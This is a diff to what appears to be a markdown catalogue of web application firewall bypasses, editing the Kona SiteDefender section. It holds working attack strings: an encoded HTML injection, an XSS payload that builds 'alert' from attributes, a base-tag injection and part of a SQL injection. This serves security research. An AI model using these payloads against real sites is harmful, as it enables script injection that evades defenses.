@@ -2971,11 +2971,15 @@ stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS 
 - [Imperva SecureSphere <= v13 - Privilege Escalation](https://www.exploit-db.com/exploits/45130) by [@0x09AL](https://www.exploit-db.com/?author=8991)
 
 ### Kona SiteDefender
-- HTML Injection by [@sp1d3rs](https://twitter.com/h1_sp1d3rs)
+- [HTML Injection](https://hackerone.com/reports/263226) by [@sp1d3rs](https://twitter.com/h1_sp1d3rs)
 ```
 %2522%253E%253Csvg%2520height%3D%2522100%2522%2520width%3D%2522100%2522%253E%2520%253Ccircle%2520cx%3D%252250%2522%2520cy%3D%252250%2522%2520r%3D%252240%2522%2520stroke%3D%2522black%2522%2520stroke-width%3D%25223%2522%2520fill%3D%2522red%2522%2520%2F%253E%2520%253C%2Fsvg%253E
 ```
-- XSS Bypass by [@zseano](https://twitter.com/zseano)
+- [XSS Bypass](https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c) by [@Jonathan Bouman](https://twitter.com/jonathanbouman)
+```
+<body%20alt=al%20lang=ert%20onmouseenter="top['al'+lang](/PoC%20XSS%20Bypass%20by%20Jonathan%20Bouman/)"
+```
+- [XSS Bypass](https://twitter.com/XssPayloads/status/1008573444840198144?s=20) by [@zseano](https://twitter.com/zseano)
 ```
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
 ```
